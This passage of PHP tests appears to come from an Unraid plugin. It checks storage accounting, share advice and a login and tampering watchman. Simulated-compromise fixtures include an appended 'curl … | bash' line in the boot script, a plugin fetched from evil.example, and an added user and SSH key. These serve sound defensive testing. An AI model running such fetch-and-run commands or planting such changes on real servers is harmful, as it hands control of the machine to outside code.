    same('zfs space: used and what the snapshots hold, only the datasets named', [$aside => ['used' => 17299173376, 'snaps' => 17299075072]], $space);
    same('zfs space: one call naming them, none without datasets', [[['zfs', 'list', '-Hp', '-o', 'name,used,usedbysnapshots', $aside, 'pool/gone', 'master/domains/odd']], []],
        [$calls, clZfsSpace([], $zfs)]);
    $raw = [
        'appdata'   => ['folders' => ['list' => [['parts' => [['dataset' => 'master/appdata/x'], ['dataset' => null]]], ['parts' => [['dataset' => 'tmpfs'], ['dataset' => '/dev/sdb1']]]]]],
        'domains'   => ['folders' => ['list' => [['parts' => [['dataset' => $aside]]]]]],
        'leftovers' => ['list' => [['parts' => [['dataset' => $aside], ['dataset' => null]]]]],
        'trash'     => [['items' => [['zfs' => 'master/domains/_UnraidSecretaryOffice-trash-20261004-150957-W', 'present' => true], ['zfs' => 'master/gone', 'present' => false],
                                     ['zfs' => null, 'present' => true], ['zfs' => '-o/x', 'present' => true]]]],
    ];
    same('zfs space: the datasets of the rooms, each once (no device, no tmpfs, no option)', ['master/appdata/x', $aside, 'master/domains/_UnraidSecretaryOffice-trash-20261004-150957-W'],
        clRawDatasets($raw));
    $path = "/mnt/$aside";
    $lo = clLeftoverSizes([['parts' => [['path' => $path, 'dataset' => $aside, 'file' => false, 'bytes' => null],
                                        ['path' => '/mnt/master/appdata/zz/pg.aside-20261006-172818', 'dataset' => null, 'file' => false, 'bytes' => null]]]],
        ['sizes' => [$path => ['bytes' => 0, 'at' => time()], '/mnt/master/appdata/zz/pg.aside-20261006-172818' => ['bytes' => 18404352, 'at' => time()]]], fn () => false, $space)[0];
    same('leftovers: a dataset set aside with all in its snapshots — 17.3 GB, of which 17.3 GB in them (not «0 B»)',
        [17299173376 + 18404352, 17299075072, 17299173376, 17299075072, null, false], [$lo['bytes'], $lo['snaps'], $lo['parts'][0]['bytes'], $lo['parts'][0]['snaps'], $lo['parts'][1]['snaps'], $lo['measuring']]);
    $lo = clLeftoverSizes([['parts' => [['path' => $path, 'dataset' => $aside, 'file' => false, 'bytes' => null]]]], ['sizes' => []], fn () => true, [])[0];
    same('leftovers: without ZFS\'s word, measured in the background', [null, 0, true], [$lo['bytes'], $lo['snaps'], $lo['measuring']]);
    $old = time() - 40 * 86400;
    $list = [['name' => 'VM.aside-20261006-175854', 'parts' => [['root' => 'master', 'path' => $path, 'dataset' => $aside, 'zfs' => true, 'mtime' => $old]]]];
    $cache = ['sizes' => [$path => ['at' => time(), 'files' => 3, 'bytes' => 98304, 'newest' => $old, 'top' => []]]];
    $f = clFolderEntries($list, [], [], 'domain', true, true, $cache, fn () => false, $space)[0];
    same('domains: a folder that is a dataset counts its snapshots, find still tells files and the newest change', [17299173376, 17299075072, 17299075072, 3, $old],
        [$f['bytes'], $f['snaps'], $f['parts'][0]['snaps'], $f['files'], $f['newest']]);
    $f = clFolderEntries($list, [], [], 'domain', true, true, $cache, fn () => false)[0];
    same('domains: without ZFS\'s word what find counted', [98304, 0], [$f['bytes'], $f['snaps']]);
    foreach (['snaps.chip', 'snaps.chip_text', 'snaps.of', 'snaps.of_run', 'lo.since_made', 'lo.d.made'] as $k) {
        check("cleanup: words for $k", isset($en[$k]));
    }

    // what his journals name is his room's only — exactly by path, never by a name's pattern
    $los = [['path' => '/mnt/user/appdata/prometheus.restored-20261007-000716', 'parts' => [['path' => '/mnt/master/appdata/prometheus.restored-20261007-000716']]],
            ['path' => '/mnt/master/domains/Win.aside-20261006-175854', 'parts' => []]];
    $folders = ['files' => 2, 'list' => [
        ['name' => 'prometheus.restored-20261007-000716', 'parts' => [['path' => '/mnt/master/appdata/prometheus.restored-20261007-000716'], ['path' => '/mnt/disk1/appdata/prometheus.restored-20261007-000716']]],
        ['name' => 'grafana.restored-20261007-000716', 'parts' => [['path' => '/mnt/master/appdata/grafana.restored-20261007-000716']]],
        ['name' => 'prometheus', 'parts' => [['path' => '/mnt/master/appdata/prometheus']]]]];
    $kept = clWithoutLeftovers($folders, $los, 'appdata');
    same('his leftovers: out of the appdata room (all its parts), a look-alike nobody named and the rest stay',
        [['grafana.restored-20261007-000716', 'prometheus'], 2], [array_column($kept['list'], 'name'), $kept['files']]);
    $dom = clWithoutLeftovers(['list' => [['name' => 'Win.aside-20261006-175854', 'parts' => [['path' => '/mnt/master/domains/Win.aside-20261006-175854'],
                                                                                         ['path' => '/mnt/hive/domains/Win.aside-20261006-175854']]]]], $los, 'domains');
    same('his leftovers: a pool path takes out that part only', [['/mnt/hive/domains/Win.aside-20261006-175854']], array_map(fn ($f) => array_column($f['parts'], 'path'), $dom['list']));
    same('his leftovers: none named, nothing taken out', $folders, clWithoutLeftovers($folders, [], 'appdata'));

    // a restore finished after her last look: the page looks again (his job file's time, never while the lock is held)
    $tmp = hardeningTmp('restore-newer');
    $GLOBALS['clRestoreJob'] = "$tmp/restore-job.json";
    same('restore newer: no job file, or never looked', [null, null], [clRestoreNewer(time() - 60, false), clRestoreNewer(null, false)]);
    file_put_contents("$tmp/restore-job.json", '{}');
    $t = time() - 10;
    touch("$tmp/restore-job.json", $t);
    same('restore newer: after her look / before it / while the lock is held', [$t, null, null],
        [clRestoreNewer($t - 50, false), clRestoreNewer($t + 5, false), clRestoreNewer($t - 50, true)]);
    unset($GLOBALS['clRestoreJob']);
    hardeningRm($tmp);
}

function testComposeBuilds(): void
{
    $yaml = "name: x\nservices:\n  db:\n    image: mariadb:11\n    environment:\n      build: no   # an env value, not a key of the service\n"
          . "  app:\n    # Updates: docker compose build --pull\n    image: nextcloud-ocr:\${V}\n    build:\n      context: .\n"
          . "  \"web\":\n    build: ./web\n  cron:\n    image: nextcloud-ocr:\${V}\nnetworks:\n  build:\n    driver: bridge\n";
    same('compose builds: services with build:, nothing else', ['app', 'web'], waComposeBuilds($yaml));
    same('compose builds: none', [], waComposeBuilds("services:\n  a:\n    image: x\n"));
}

/**
 * Ms. Dustdevil's «Where is what» on exclusive shares: which shares would become exclusive once
 * «Permit exclusive shares» is on, which can't (a folder on another pool or
 * disk), which Unraid refuses for no reason she can see, and which only their
 * secondary storage keeps from it — from the tour's shares only (fixtures).
 */
function testExclusive(): void
{
    $roots = ['disk1' => ['fs' => 'xfs', 'kind' => 'disk'], 'disk2' => ['fs' => 'xfs', 'kind' => 'disk'],
              'cache' => ['fs' => 'zfs', 'kind' => 'pool'], 'fast' => ['fs' => 'btrfs', 'kind' => 'pool']];
    // shaped like waShares()' storage: use_cache, primary, secondary, exclusive (shares.ini), pools/disks with a top folder
    $share = fn (string $name, string $use, string $primary, ?string $secondary, array $pools, array $disks = [], bool $exclusive = false, bool $missing = false)
        => ['name' => $name, 'storage' => ['use_cache' => $use, 'primary' => $primary, 'secondary' => $secondary, 'exclusive' => $exclusive,
                                           'pools' => $pools, 'disks' => $disks, 'missing' => $missing]];
    $shares = [
        $share('appdata', 'only', 'cache', null, ['cache']),                         // qualifies
        $share('system', 'only', 'cache', null, ['cache'], ['disk1']),               // a folder on disk1 too
        $share('drop', 'only', 'fast', null, ['cache', 'fast']),                     // nostromo's drop: mother + hive
        $share('films', 'yes', 'cache', 'array', ['cache'], ['disk1']),              // cache → array: belongs to the array
        $share('media', 'no', 'array', null, [], ['disk1', 'disk2']),
        $share('tm', 'prefer', 'fast', 'cache', ['cache', 'fast']),                  // pool ← pool, data meant on fast
        $share('vms', 'prefer', 'cache', 'array', ['cache']),                        // pool ← array
        $share('later', 'prefer', 'cache', 'array', [], ['disk1']),                  // nothing on its pool yet
        $share('gone', 'only', 'old', null, [], [], false, true),                    // a pool that doesn't exist
        $share('new', 'only', 'cache', null, []),                                    // no folder anywhere (yet)
        $share('moved', 'only', 'fast', null, ['cache']),                         // only elsewhere, not on its pool
    ];
    $asleep = ['disk2' => true, 'disk1' => false, 'cache' => false];

    // off: what would become exclusive — nothing else is told but the overflow
    $off = waExclusive($shares, $roots, $asleep, ['shareUserExclusive' => 'no', 'shareUser' => 'e']);
    same('exclusive off: permitted', false, $off['permitted']);
    same('exclusive off: would become exclusive', ['appdata'], $off['ready']);
    same('exclusive off: no reasons asked for yet', [[], []], [$off['unclear'], $off['elsewhere']]);
    same('exclusive off: only the secondary storage stands in the way', [
        ['name' => 'tm', 'pool' => 'fast', 'secondary' => 'cache', 'where' => ['cache']],
        ['name' => 'vms', 'pool' => 'cache', 'secondary' => 'array', 'where' => []]], $off['overflow']);
    same('exclusive off: asleep = roots not looked at', ['disk2'], $off['asleep']);
    same('exclusive: an empty share.cfg means off', false, waExclusive($shares, $roots, $asleep, [])['permitted']);

    // on: Unraid's word (shares.ini) for appdata and drop; reasons for those it refuses
    $on = $shares;
    $on[0]['storage']['exclusive'] = true;                                       // appdata: fine, nothing to say
    $on[] = $share('fresh', 'only', 'fast', null, ['fast']);                         // qualifies, Unraid still says no
    $r = waExclusive($on, $roots, $asleep, ['shareUserExclusive' => 'yes']);
    same('exclusive on: permitted', true, $r['permitted']);
    same('exclusive on: nothing "would become" any more', [], $r['ready']);
    same('exclusive on: a folder on another pool or disk', [
        ['name' => 'system', 'pool' => 'cache', 'where' => ['disk1']],
        ['name' => 'drop', 'pool' => 'fast', 'where' => ['cache']],
        ['name' => 'moved', 'pool' => 'fast', 'where' => ['cache']]], $r['elsewhere']);
    same('exclusive on: no reason in sight', ['fresh'], $r['unclear']);
    same('exclusive on: overflow still told', ['tm', 'vms'], array_column($r['overflow'], 'name'));

    // all exclusive that can be: nothing to tell
    $all = [$share('appdata', 'only', 'cache', null, ['cache'], [], true), $share('media', 'no', 'array', null, [], ['disk1']),
            $share('films', 'yes', 'cache', 'array', ['cache'], ['disk1'])];
    $quiet = waExclusive($all, $roots, [], ['shareUserExclusive' => 'yes']);
    same('exclusive: all done — no tip', [[], [], [], [], []],
        [$quiet['ready'], $quiet['unclear'], $quiet['elsewhere'], $quiet['overflow'], $quiet['asleep']]);

    // user shares off (no /mnt/user), the array stopped (no roots): nothing
    $noUser = waExclusive($shares, $roots, $asleep, ['shareUserExclusive' => 'no', 'shareUser' => '-']);
    same('exclusive: user shares off — nothing', [[], [], [], []], [$noUser['ready'], $noUser['unclear'], $noUser['elsewhere'], $noUser['overflow']]);
    $stopped = waExclusive($shares, [], [], ['shareUserExclusive' => 'no']);
    same('exclusive: array stopped — nothing', [[], []], [$stopped['ready'], $stopped['overflow']]);
    $numeric = $share('x', 'only', 'cache', null, ['cache']);
    $numeric['name'] = 2024;                                                         // array_keys() of shares.ini makes it an int
    same('exclusive: a numeric share name stays a string', ['2024'], waExclusive([$numeric], $roots, [], [])['ready']);

    // the page builds four tips from it: each needs its title and why (the other languages are compared to English)
    $en = json_decode((string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/lang/en.json'), true);
    foreach (['exclusive_off', 'exclusive_elsewhere', 'exclusive_unclear', 'exclusive_overflow'] as $id) {
        check("where: texts for tip $id", isset($en["where.adv.$id.title"], $en["where.adv.$id.why"]));
        check("where: tip $id is built in desk.js",
            str_contains((string) file_get_contents(OFFICE_DIR . '/public/desks/cleanup/desk.js'), "add('$id',"));
    }
}

/**
 * The night watchman: his login lines, bursts of failures, the syslog by
 * offset and rotation, rights and plugin sources, and a whole watch on copies
 * — taking over (nothing reported), a night with changes (one entry each,
 * one notification per kind), «I know, thanks» (the new normal), the team
 * lead's note, hired anew.
 */
function testWatchman(): void
{
    $now = strtotime('2026-10-06 12:00:00');
    $known = ['root' => true, 'benj' => true];
    $p = fn (string $l) => watchmanParseLine($l, $known, $now);
    $pick = fn (?array $e, array $keys) => $e === null ? null : array_map(fn ($k) => $e[$k], $keys);

    // lines: Unraid's web login (dynamix/include/.login.php) and SSH
    same('watch line: web login', [true, 'web', 'root', '192.168.7.125', strtotime('2026-10-06 11:58:01')],
        $pick($p('Oct  6 11:58:01 Tower webgui: Successful login user root from 192.168.7.125'), ['ok', 'service', 'user', 'ip', 'time']));
    same('watch line: web failure with its cooldown', [false, 'root', '192.168.7.66'],
        $pick($p('Oct  6 11:58:02 Tower webgui: Unsuccessful login user root from 192.168.7.66. Ignoring login attempts for 900 seconds.'), ['ok', 'user', 'ip']));
    same('watch line: what was typed as the name is never the address, nor kept unless a user', [false, null, '10.0.0.5'],
        $pick($p('Oct  6 11:58:03 Tower webgui: Unsuccessful login user hunter2 from 9.9.9.9 from 10.0.0.5. '), ['ok', 'user', 'ip']));
    same('watch line: SSH with a key', [true, 'ssh:publickey', 'root', '192.168.7.219'],
        $pick($p('Oct  6 11:59:00 Tower sshd-session[2347524]: Accepted publickey for root from 192.168.7.219 port 59009 ssh2: RSA SHA256:abc'), ['ok', 'service', 'user', 'ip']));
    same('watch line: SSH password failed', [false, 'ssh:password', 'root', '203.0.113.9'],
        $pick($p('Oct  6 11:59:01 Tower sshd[123]: Failed password for root from 203.0.113.9 port 4242 ssh2'), ['ok', 'service', 'user', 'ip']));
    same('watch line: "Failed … for invalid user" counts through its "Invalid user" line', null,
        $p('Oct  6 11:59:02 Tower sshd[123]: Failed password for invalid user admin from 203.0.113.9 port 4243 ssh2'));
    same('watch line: invalid user, the name not kept', [false, null, '203.0.113.9'],
        $pick($p('Oct  6 11:59:02 Tower sshd[123]: Invalid user admin from 203.0.113.9 port 4243'), ['ok', 'user', 'ip']));
    same('watch line: IPv4 inside IPv6', '192.168.7.5', $p('Oct  6 11:59:03 Tower sshd-session[9]: Accepted password for root from ::ffff:192.168.7.5 port 1 ssh2')['ip'] ?? null);
    same('watch line: other lines are none', [null, null, null], [
        $p('Oct  6 11:59:04 Tower sshd-session[9]: Postponed publickey for root from 1.2.3.4 port 5 ssh2 [preauth]'),
        $p('Oct  6 11:59:04 Tower webgui: TimeMachine: Could not download icon /boot/config/plugins/dockerMan/images/x.png'),
        $p('Oct  6 11:59:04 Tower webgui: Successful login user root from not-an-address')]);
    same('watch time: December read in January', '2025-12-31 23:59:00',
        date('Y-m-d H:i:s', (int) watchmanLineTime('Dec 31 23:59:00 Tower x', strtotime('2026-01-01 00:10:00'))));

    // bursts: WATCH_FAIL_BURST failures from one address within WATCH_FAIL_WINDOW
    $fail = fn (int $t, ?string $u = 'root', string $ip = '203.0.113.9') => ['ok' => false, 'service' => 'ssh:password', 'user' => $u, 'ip' => $ip, 'time' => $t];
    $fails = [];
    $adds = [];
    foreach ([0, 60, 120, 180] as $t) {
        $adds[] = watchmanFailStep($fails, $fail($now + $t));
    }
    $adds[] = watchmanFailStep($fails, $fail($now + 240, null));
    $adds[] = watchmanFailStep($fails, $fail($now + 300));
    same('watch burst: four are nothing, the fifth starts it with all five, then one each', [0, 0, 0, 0, 5, 1], $adds);
    same('watch burst: names tried (users only) and unknown ones counted', [['root'], 1], [$fails['203.0.113.9']['users'], $fails['203.0.113.9']['unknown']]);
    same('watch burst: a pause longer than the window starts anew', 0, watchmanFailStep($fails, $fail($now + 301 + WATCH_FAIL_WINDOW)));
    $slow = [];
    $n = 0;
    foreach (range(0, 9) as $i) {
        $n += watchmanFailStep($slow, $fail($now + $i * 200, 'root', '198.51.100.1'));
    }
    same('watch burst: ten failures 200 s apart are no burst', 0, $n);

    // the syslog by offset; rotated: the rest of syslog.1 (by inode), then the new one; nothing twice
    $tmp = sys_get_temp_dir() . '/office-tests-watch-' . getmypid();
    @mkdir($tmp, 0700, true);
    $log = "$tmp/syslog";
    file_put_contents($log, "Oct  6 10:00:00 Tower webgui: Successful login user root from 192.168.7.10\nOct  6 10:00:01 Tower kernel: x\n");
    [$ev, $pos] = watchmanReadLogins($log, null, true, $known, $now);
    same('watch read: taking over reads all of it', [['192.168.7.10'], filesize($log)], [array_column($ev, 'ip'), $pos['size']]);
    [$ev, $pos2] = watchmanReadLogins($log, null, false, $known, $now);
    same('watch read: without a position, from now on', [[], filesize($log)], [$ev, $pos2['size']]);
    file_put_contents($log, "Oct  6 10:01:00 Tower webgui: Successful login user root from 192.168.7.11\n"
        . 'Oct  6 10:01:01 Tower webgui: Successful login user root from 192.168.7.12', FILE_APPEND);
    [$ev, $pos] = watchmanReadLogins($log, $pos, false, $known, $now);
    same('watch read: only what came, whole lines', ['192.168.7.11'], array_column($ev, 'ip'));
    rename($log, "$log.1");
    file_put_contents("$log.1", "\n", FILE_APPEND);
    file_put_contents($log, "Oct  6 10:02:00 Tower sshd[1]: Accepted publickey for root from 192.168.7.13 port 1 ssh2\n");
    [$ev, $pos, $info] = watchmanReadLogins($log, $pos, false, $known, $now);
    same('watch read: rotated — the rest of the old file, then the new one', [true, ['192.168.7.12', '192.168.7.13']],
        [$info['rotated'], array_column($ev, 'ip')]);
    same('watch read: nothing twice', [], watchmanReadLogins($log, $pos, false, $known, $now)[0]);
    exec('rm -rf ' . escapeshellarg($tmp));

    // rights as docker run flags; a plugin's source from its own entities
    same('watch rights', ['--cap-add=SYS_ADMIN', '--device=/dev/fuse', '--network=host', '--privileged', '-p 127.0.0.1:8080:80/tcp', '-p 9090/tcp', '-v /var/run/docker.sock'],
        watchmanContainerTokens(['Privileged' => true, 'NetworkMode' => 'host', 'PidMode' => '', 'CapAdd' => ['CAP_SYS_ADMIN'],
            'Devices' => [['PathOnHost' => '/dev/fuse']], 'PortBindings' => ['80/tcp' => [['HostIp' => '127.0.0.1', 'HostPort' => '8080']], '9090/tcp' => [['HostIp' => '', 'HostPort' => '']]]],
            [['Type' => 'bind', 'Source' => '/var/run/docker.sock'], ['Type' => 'bind', 'Source' => '/mnt/user/appdata/x']]));
    same('watch rights: published ports alone are none', [], watchmanRights(['-p 80:80/tcp']));
    $plg = "<!ENTITY name \"filesviewer\">\n<!ENTITY branch \"main\">\n<!ENTITY version \"2026.08.24\">\n"
         . "<!ENTITY pluginURL \"https://github.com/x/releases/download/&version;/&name;.txz\">\n"
         . "<!ENTITY selfURL \"https://raw.githubusercontent.com/Lazaros-Chalkidis/unraid-filesviewer/&branch;/&name;.plg\">\n"
         . "<PLUGIN name=\"&name;\" version=\"&version;\"\n        pluginURL=\"&selfURL;\" launch=\"x\">";
    same('watch plugin: the <PLUGIN> attribute, entities resolved', ['https://raw.githubusercontent.com/Lazaros-Chalkidis/unraid-filesviewer/main/filesviewer.plg', '2026.08.24'],
        watchmanPluginUrl($plg));
    same('watch plugin: source with the owner on code hosts', ['raw.githubusercontent.com/Lazaros-Chalkidis', 'stable.dl.unraid.net', ''],
        [watchmanSource(watchmanPluginUrl($plg)[0]), watchmanSource('https://stable.dl.unraid.net/x.plg'), watchmanSource(null)]);

    // a whole watch, on copies
    $tmp = sys_get_temp_dir() . '/office-tests-watch-' . getmypid();
    $src = "$tmp/src";
    $data = "$tmp/data";
    foreach (['plugins', 'extra', 'ssh/root'] as $d) {
        @mkdir("$src/$d", 0700, true);
    }
    $paths = ['syslog' => "$src/syslog", 'plugins' => "$src/plugins", 'go' => "$src/go", 'extra' => "$src/extra", 'passwd' => "$src/passwd",
              'shadow' => "$src/shadow", 'ssh' => "$src/ssh", 'sec' => "$src/sec.ini", 'sec_nfs' => "$src/sec_nfs.ini",
              'share_cfg' => "$src/share.cfg", 'etc_passwd' => "$src/passwd"];
    $line = fn (int $t, string $s) => date('M ', $t) . str_pad(date('j', $t), 2, ' ', STR_PAD_LEFT) . date(' H:i:s', $t) . " Tower $s\n";
    $history = $line($now - 7200, 'webgui: Successful login user root from 192.168.7.10');
    foreach (range(0, 5) as $i) {      // a client that keeps failing (it had a burst before he came)
        $history .= $line($now - 5000 + $i, 'webgui: Unsuccessful login user root from 192.168.7.66. ');
    }
    file_put_contents($paths['syslog'], $history);
    $plgFile = fn (string $owner) => "<!ENTITY name \"ca\">\n<!ENTITY github \"$owner/ca\">\n"
        . "<!ENTITY pluginURL \"https://raw.githubusercontent.com/&github;/master/&name;.plg\">\n<PLUGIN name=\"&name;\" version=\"1\" pluginURL=\"&pluginURL;\">\n";
    file_put_contents("$src/plugins/ca.plg", $plgFile('unraid'));
    file_put_contents($paths['go'], "#!/bin/bash\n/usr/local/sbin/emhttp &\n");
    file_put_contents($paths['passwd'], "root:x:0:0:Console and webGui login account:/root:/bin/bash\nbenj:x:1000:100::/:/bin/false\n");
    file_put_contents($paths['shadow'], 'root:$6$aa$bb:20000:0:99999:7:::' . "\n" . 'benj:$6$cc$dd:20000:0:99999:7:::' . "\n");
    $key = fn (string $c) => 'ssh-ed25519 ' . base64_encode("\0\0\0\x0bssh-ed25519\0\0\0\x20" . random_bytes(32)) . " $c";
    file_put_contents("$src/ssh/root/authorized_keys", $key('benj@mac') . "\n");
    $sec = fn (string $media) => "[\"appdata\"]\nexport=\"e\"\nsecurity=\"private\"\n[\"Media\"]\nexport=\"$media\"\nsecurity=\"public\"\n[\"flash\"]\nexport=\"-\"\nsecurity=\"public\"\n";
    file_put_contents($paths['sec'], $sec('-'));
    file_put_contents($paths['sec_nfs'], "[\"appdata\"]\nexport=\"-\"\nsecurity=\"public\"\n");
    file_put_contents($paths['share_cfg'], "shareSMBEnabled=\"yes\"\nshareNFSEnabled=\"no\"\n");
    $containers = ['kopia' => ['image' => 'kopia', 'tokens' => ['--cap-add=SYS_ADMIN']], 'plex' => ['image' => 'plex', 'tokens' => ['-p 32400:32400/tcp']]];
    $docker = function () use (&$containers) {
        return $containers;
    };
    $acks = "$tmp/acks.json";
    $notified = "$tmp/notified";
    file_put_contents("$tmp/notify", "#!/bin/bash\nfor a in \"\$@\"; do printf '%s\\x1f' \"\$a\"; done >> " . escapeshellarg($notified) . "\necho >> " . escapeshellarg($notified) . "\n");
    chmod("$tmp/notify", 0755);
    $envBefore = getenv('OFFICE_NOTIFY_BIN');
    putenv("OFFICE_NOTIFY_BIN=$tmp/notify");
    $calls = fn () => array_values(array_filter(explode("\n", (string) @file_get_contents($notified))));
    $open = fn () => array_count_values(array_column(array_filter(watchmanLoad($data)['book'], 'watchmanOpen'), 'kind'));

    $r = watchmanRound($paths, $data, 1000, $now, $docker, true, $acks);
    $d = watchmanLoad($data);
    same('watch: the first round takes over and reports nothing', [true, [], [], 0], [$r['fresh'], $r['added'], $open(), count($calls())]);
    same('watch: what is normal now', [['192.168.7.10'], ['192.168.7.66'], ['kopia', 'plex'], ['ca' => 'raw.githubusercontent.com/unraid'], ['root', 'benj'], 1, ['Media', 'appdata', 'flash']],
        [array_keys($d['baseline']['ips']), array_keys($d['baseline']['fail_ips']), array_keys($d['baseline']['containers']),
         array_map(fn ($x) => $x['source'], $d['baseline']['plugins']), $d['baseline']['flash']['users'], count($d['baseline']['flash']['keys']['root']),
         array_keys($d['baseline']['shares'])]);
    same('watch: one line in the book that he took over', ['watch'], array_column($d['book'], 'kind'));
    check('watch: never a password field in his files', !str_contains((string) file_get_contents("$data/baseline.json") . file_get_contents("$data/seen.json"), '$6$'));
    same('watch: the team lead hears "quiet"', [['quiet', true]], array_map(fn ($f) => [$f['id'], $f['ok']], watchmanChecks($data)));

    // the night: what differs
    $t = $now + 300;
    $night = $line($t, 'webgui: Successful login user root from 10.9.8.7')
           . $line($t, 'sshd-session[5]: Accepted publickey for root from 192.168.7.10 port 2 ssh2: ED25519 SHA256:x');
    foreach (range(0, 5) as $i) {
        $night .= $line($t + $i, 'sshd[7]: Failed password for root from 203.0.113.9 port ' . (4000 + $i) . ' ssh2');
        $night .= $line($t + $i, 'webgui: Unsuccessful login user root from 192.168.7.66. ');
    }
    file_put_contents($paths['syslog'], $night, FILE_APPEND);
    $containers['plex']['tokens'] = ['--privileged', '-p 32400:32400/tcp', '-p 8080:80/tcp'];
    $containers['kopia']['tokens'] = [];
    $containers['vpn'] = ['image' => 'wireguard', 'tokens' => ['--cap-add=NET_ADMIN', '--network=host']];
    $containers['web'] = ['image' => 'nginx', 'tokens' => ['-p 80:80/tcp']];
    file_put_contents("$src/plugins/ca.plg", $plgFile('someone'));
    file_put_contents("$src/plugins/evil.plg", "<PLUGIN name=\"evil\" version=\"1\" pluginURL=\"https://evil.example/evil.plg\">\n");
    file_put_contents($paths['go'], "curl -s https://example.com/x | bash\n", FILE_APPEND);
    file_put_contents("$src/extra/tool.txz", 'x');
    file_put_contents($paths['passwd'], "eve:x:1001:100::/:/bin/false\n", FILE_APPEND);
    file_put_contents($paths['shadow'], 'root:$6$ee$ff:20001:0:99999:7:::' . "\n" . 'benj:$6$cc$dd:20000:0:99999:7:::' . "\n" . 'eve:$6$gg$hh:20001:0:99999:7:::' . "\n");
    file_put_contents("$src/ssh/root/authorized_keys", $key('someone@else') . "\n", FILE_APPEND);
    file_put_contents($paths['sec'], $sec('e'));
    $r = watchmanRound($paths, $data, 1000, $now + 600, $docker, true, $acks);
    $kinds = $open();
    ksort($kinds);
    same('watch: one entry for each thing that differs', ['container_new' => 1, 'container_ports' => 1, 'container_privileged' => 1,
        'flash_extra' => 1, 'flash_go' => 1, 'flash_password' => 1, 'flash_ssh_key' => 1, 'flash_user' => 1, 'login_failures' => 1,
        'login_new_ip' => 1, 'plugin_new' => 1, 'plugin_source' => 1, 'share_public' => 1], $kinds);
    $d = watchmanLoad($data);
    $by = array_column(array_filter($d['book'], 'watchmanOpen'), null, 'kind');
    same('watch: the burst — how many, who', [6, ['root'], '203.0.113.9'], [$by['login_failures']['count'], $by['login_failures']['p']['users'], $by['login_failures']['p']['ip']]);
    same('watch: an address known for failing is counted, not reported', 6, $d['baseline']['fail_ips']['192.168.7.66']['quiet'] ?? null);
    same('watch: fewer rights are the new normal', [], $d['baseline']['containers']['kopia']['tokens']);
    same('watch: a new container with only ports is normal', ['-p 80:80/tcp'], $d['baseline']['containers']['web']['tokens'] ?? null);
    same('watch: rights as flags, the plugin source moved', ['--privileged', 'raw.githubusercontent.com/someone', 'raw.githubusercontent.com/unraid', ['added' => 1, 'removed' => 0]],
        [watchmanText($by['container_privileged'])['rights'], $by['plugin_source']['p']['source'], $by['plugin_source']['p']['old'], watchmanText($by['flash_go'])]);
    $c = $calls();
    same('watch: one notification per important kind (ports only in the book), and one for what may belong together (a new address, then rights, plugins, the flash)', 13, count($c));
    check('watch: the chain\'s notification', str_contains(implode("\n", $c), officeNotifyText('watchman', 'notify.chain', ['n' => 12], officeNotifyLang())));
    $lang = officeNotifyLang();
    check('watch: the notification in Unraid\'s language',
        str_contains(implode("\n", $c), OFFICE_NOTIFY_EVENT . ': ' . officeNotifyText('watchman', 'notify.login_failures', ['n' => 1] + watchmanText($by['login_failures']), $lang)));
    $f = array_column(watchmanChecks($data), null, 'id');
    same('watch: the team lead gets one finding per kind, recommended, with the newest', [13, 'recommended', false, 1, '10.9.8.7'],
        [count($f) - 1, $f['login_new_ip']['level'], $f['login_new_ip']['ok'], $f['login_new_ip']['params']['n'], $f['login_new_ip']['params']['ip']]);
    same('watch: and, good to know, how many security tips (Media open to everyone; privileged plex is only good to know)', ['hint', 1],
        [$f['posture']['level'] ?? null, $f['posture']['params']['n'] ?? null]);

    // the same again, the burst going on: no new entry, nothing told again
    file_put_contents($paths['syslog'], $line($t + 30, 'sshd[7]: Failed password for root from 203.0.113.9 port 4999 ssh2'), FILE_APPEND);
    $r = watchmanRound($paths, $data, 1000, $now + 900, $docker, true, $acks);
    same('watch: seen again — nothing new, the burst counts on, nobody told twice', [[], 7, 13],
        [$r['added'], array_column(array_filter(watchmanLoad($data)['book'], 'watchmanOpen'), null, 'kind')['login_failures']['count'], count($calls())]);

    // «I know, thanks»: one, then the rest — the new normal
    $id = $by['container_privileged']['id'];
    watchmanAck($id, $data, $now + 1000, false);
    same('watch ack: the container\'s new right is normal now', true, in_array('--privileged', watchmanLoad($data)['baseline']['containers']['plex']['tokens'], true));
    try {
        watchmanAck($id, $data, $now + 1001, false);
        check('watch ack: twice is refused', false);
    } catch (Problem $e) {
        same('watch ack: twice is refused', 'watch_gone', $e->key);
    }
    // the team lead noted the plugin finding: here it counts as noted too
    $plugin = array_column(watchmanChecks($data), null, 'id')['plugin_new'];
    file_put_contents($acks, json_encode(['acks' => [caretakerAckSig('watchman', $plugin) => ['desk' => 'watchman', 'id' => 'plugin_new', 'time' => $now, 'seen' => $now]]]));
    $r = watchmanRound($paths, $data, 1000, $now + 1200, $docker, true, $acks);
    $d = watchmanLoad($data);
    same('watch: the team lead\'s note counts here too', ['teamlead', 'evil.example'],
        [array_column($d['book'], null, 'kind')['plugin_new']['by'] ?? null, $d['baseline']['plugins']['evil']['source'] ?? null]);
    watchmanAck('*', $data, $now + 1300, false);
    same('watch ack: all noted, nothing open', [], $open());
    $r = watchmanRound($paths, $data, 1000, $now + 1500, $docker, true, $acks);
    same('watch: after noting, the same state reports nothing', [[], []], [$r['added'], $open()]);
    $b = watchmanLoad($data)['baseline'];
    same('watch: noted is normal (address, share, user, key, go)', [true, 2, true, 2, 3],
        [isset($b['ips']['10.9.8.7']), $b['shares']['Media']['smb'], in_array('eve', $b['flash']['users'], true), count($b['flash']['keys']['root']),
         count($b['flash']['go']['lines'])]);

    // a new burst within the hour after the last message: in the book, told only later
    $before = count($calls());
    file_put_contents($paths['syslog'], implode('', array_map(fn ($i) => $line($now + 1600 + $i, "sshd[8]: Invalid user x$i from 198.51.100.7 port $i"), range(0, 4))), FILE_APPEND);
    $r = watchmanRound($paths, $data, 1000, $now + 1700, $docker, true, $acks);
    same('watch notify: within the quiet hour — in the book, not told yet', [['login_failures'], $before], [$r['added'], count($calls())]);
    $r = watchmanRound($paths, $data, 1000, $now + 300 + 600 + WATCH_NOTIFY_QUIET, $docker, true, $acks);
    same('watch notify: after the hour — told', [[['kind' => 'login_failures', 'n' => 1, 'sent' => true]], $before + 1], [$r['told'], count($calls())]);

    // the page and the metrics: newest first, no internals
    $page = watchmanPageState($data, $now + 5000, false);
    check('watch page: newest first', $page['book'][0]['last'] >= end($page['book'])['last']);
    check('watch page: no internal values', !str_contains(json_encode($page), '"_h"'));
    $failing = array_column($page['watch']['fail_ips'], 'ip');
    sort($failing);
